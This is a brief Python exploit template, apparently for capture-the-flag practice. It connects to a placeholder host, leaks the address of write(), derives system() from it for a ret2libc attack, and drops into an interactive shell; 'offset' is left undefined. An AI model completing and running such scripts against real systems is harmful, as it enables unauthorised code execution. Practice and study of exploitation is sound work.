#!/usr/bin/python

from Pwn import *
# when binary doesn't have nx eable or mprotect/nmap is on got table
# from Shellcode import *

exp = Pwn(host='example.com',port=8888)

def exploit():
	# some exploit code
	exp.p(0xcafebabe)
	exp.write('A'*4)

	write_addr = exp.up(exp.recv(4))
	system_addr = write_addr - offset

	print '[+] write() :',hex(write_addr)
	print '[+] system() :',hex(system_addr)

	exp.io()

exploit()